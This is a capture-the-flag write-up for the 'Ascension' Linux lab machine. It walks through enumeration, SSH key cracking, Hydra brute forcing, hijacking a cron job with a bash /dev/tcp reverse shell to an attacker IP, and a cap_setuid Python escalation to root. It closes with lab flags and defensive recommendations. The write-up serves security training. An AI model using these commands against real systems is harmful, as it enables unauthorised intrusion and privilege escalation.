# Ascension — CTF Writeup

**Platform:** Hack Smarter  
**Difficulty:** Easy 
**Date:** October 2025  
**Author:** [Dilan Dodangodage]

---

## Table of Contents

1. [Summary](#summary)
2. [Enumeration](#enumeration)
   - [Port Scan](#port-scan)
   - [FTP (Port 21)](#ftp-port-21)
   - [SSH (Port 22)](#ssh-port-22)
   - [HTTP (Port 80)](#http-port-80)
   - [NFS / Shares (Port 111)](#nfs--shares-port-111)
3. [Initial Access — user1](#initial-access--user1)
4. [Post-Exploitation](#post-exploitation)
   - [Lateral Movement to user2 (Cron Job Abuse)](#lateral-movement-to-user2-cron-job-abuse)
   - [Lateral Movement to ftpuser (Credential Brute Force)](#lateral-movement-to-ftpuser-credential-brute-force)
   - [Database Enumeration & Flag](#database-enumeration--flag)
   - [Lateral Movement to user3 (Database Credentials)](#lateral-movement-to-user3-database-credentials)
5. [Privilege Escalation to Root](#privilege-escalation-to-root)
6. [Flags](#flags)
7. [Lessons Learned](#lessons-learned)

---

## Summary

Ascension is a Linux-based CTF machine exposing several misconfigured services. The attack chain involves:

- Anonymous FTP access is leaking a password list
- An exposed NFS share leaking an SSH private key
- Cracking the key's passphrase to gain initial access as `user1`
- Abusing a writable cron job to pivot to `user2`
- Brute-forcing FTP credentials with the leaked password list to access `ftpuser`
- Dumping WordPress database credentials to enumerate MySQL and pivot to `user3`
- Exploiting a Python binary with `cap_setuid` capability to escalate to `root`

---

## Enumeration

### Port Scan

```
nmap -sV -sC -p- ascension.hsm
```

| Port     | State | Service | Version               |
|----------|-------|---------|-----------------------|
| 21/tcp   | open  | ftp     | vsftpd 3.0.5          |
| 22/tcp   | open  | ssh     | OpenSSH 9.6p1 Ubuntu  |
| 80/tcp   | open  | http    | Apache 2.4.58 (Ubuntu)|
| 111/tcp  | open  | rpcbind | 2-4 (RPC #100000)     |
| 2049/tcp | open  | nfs_acl | 3 (RPC #100227)       |

---

### FTP (Port 21)

Anonymous login was permitted on the FTP server.

```bash
ftp anonymous@ascension.hsm
# Password: (blank)
```

A file named `pwlist.txt` was discovered and downloaded, containing a list of potentially compromised passwords, useful for later brute-force attacks.

```
ftp> get pwlist.txt
```

---

### SSH (Port 22)

Key-based authentication is enabled. Direct root login is denied:

```
root@ascension.hsm: Permission denied (publickey).
```

---

### HTTP (Port 80)

The server returned an Apache2 default page, but directory enumeration with **dirsearch** revealed a WordPress installation:

```
/wp-admin/       → 500
/wp-config.php   → 200
/wp-content/     → 200
/wp-login.php    → 500
```

> **Note:** WPScan failed against this target. Directory listing was enabled on `/wp-includes/` and `/wp-content/`.

---

### NFS / Shares (Port 111)

`showmount` revealed a publicly accessible NFS export:

```bash
showmount -e ascension.hsm
# Export list:
# /srv/nfs/user1 *
```

The share was mounted and found to contain SSH keys:

```bash
sudo mount -t nfs -o vers=3 ascension.hsm:/srv/nfs/user1 /mnt/ascension -o nolock
ls /mnt/ascension
# id_rsa  id_rsa.pub
```

---

## Initial Access — user1

The private key `id_rsa` was passphrase-protected. The hash was extracted and cracked using **John the Ripper** against `rockyou.txt`:

```bash
ssh2john id_rsa > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

**Cracked passphrase:** `sammie1`

SSH login as `user1` was then successful:

```bash
ssh user1@ascension.hsm -i id_rsa
# Enter passphrase: sammie1
```

---

## Post-Exploitation

### Users with Shells

```
user1:x:1001:1001::/home/user1:/bin/bash
user2:x:1002:1002::/home/user2:/bin/bash
user3:x:1003:1003::/home/user3:/bin/bash
ftpuser:x:1004:1004::/home/ftpuser:/bin/bash
```

---

### Lateral Movement to user2 (Cron Job Abuse)

Process monitoring (e.g. via `pspy`) revealed a cron job running as `user2` (UID=1002):

```
/bin/sh -c /tmp/backup.sh
```

The file `/tmp/backup.sh` was world-writable. It was replaced with a reverse shell payload:

```bash
bash -c 'exec bash -i &>/dev/tcp/10.200.17.76/1337 <&1'
```

After the cron job fired, a shell was received as `user2`. SSH backdoor was added to stabilise access.

---

### Lateral Movement to ftpuser (Credential Brute Force)

Using the `pwlist.txt` downloaded earlier, **Hydra** was used to brute-force FTP credentials:

```bash
hydra -l ftpuser -P pwlist.txt ftp://ascension.hsm
```

**Credentials found:** `ftpuser: secret`

Switched to `ftpuser` from the existing SSH session:

```bash
su ftpuser
# Password: secret
```

---

### Database Enumeration & Flag

WordPress configuration credentials were found at `/var/www/html/wp-config.php`:

```php
define('DB_NAME',     'wordpress');
define('DB_USER',     'wpuser');
define('DB_PASSWORD', 'wppassword');
define('DB_HOST',     'localhost');
```

Logged into MySQL and enumerated the `wordpress` database:

```sql
show databases;
use wordpress;
select * from flags;
```

| id | flag                                       |
|----|--------------------------------------------|
| 1  | `RkxBRzR7d2ViamhuYXNkMzg5MjM0a25kam9pM2R9` |

> **Decoded (Base64):** `FLAG4{webjhnassd389234kndjoi3d}`

---

### Lateral Movement to user3 (Database Credentials)

The `users` table in the `wordpress` database contained credentials for `user3`:

```sql
select * from users;
```

| id | username | password     |
|----|----------|--------------|
| 1  | user3    | user3password|

```bash
su user3
# Password: user3password
```

---

## Privilege Escalation to Root

Checking Linux capabilities on the filesystem:

```bash
getcap -r / 2>/dev/null
```

A Python binary in `user3`'s home directory had `cap_setuid=ep` set:

```
/home/user3/python3 cap_setuid=ep
```

This capability allows the process to set its UID to 0 (root) arbitrarily. Exploited as follows:

```bash
/home/user3/python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

```
# whoami
root
```

> **Reference:** [GTFOBins — Python Capabilities](https://gtfobins.github.io/gtfobins/python/#capabilities)

---

## Flags

| Flag | Value                              |
|------|------------------------------------|
| FLAG1| `FLAG1{hjsyu892334hjohnsd8y293h4}` |
| FLAG2| `FLAG2{sdhh98234njohn3kjdj233fd}`  |
| FLAG3| `FLAG3{gjdohnasd98234kjnbckdf}`    |
| FLAG4| `FLAG4{webjhnassd389234kndjoi3d}`  |
| FLAG5| `FLAG5{johnabcdsjhfs8234kjnboz}`   |
| FLAG6| `FLAG6{sdfjudhfs8234kjnbohndjf}`   |

---

## Lessons Learned

| Finding                                    | Risk     | Recommendation                                     |
|--------------------------------------------|----------|----------------------------------------------------|
| Anonymous FTP with sensitive files         | High     | Disable anonymous FTP or restrict accessible files |
| NFS share world-accessible                 | High     | Restrict NFS exports with IP allowlisting          |
| SSH private key without strong passphrase  | High     | Use strong, unique passphrases on all keys         |
| World-writable cron job script in `/tmp`   | Critical | Restrict cron script permissions; avoid `/tmp`     |
| Plaintext credentials in `wp-config.php`   | High     | Use environment variables or secrets management    |
| Weak database credentials                  | Medium   | Enforce strong password policy for DB users        |
| Python binary with `cap_setuid` capability | Critical | Audit and remove unnecessary Linux capabilities    |

---

*Writeup by [Dilan Dodangodage] — [https://github.com/DilanDodangodage]*
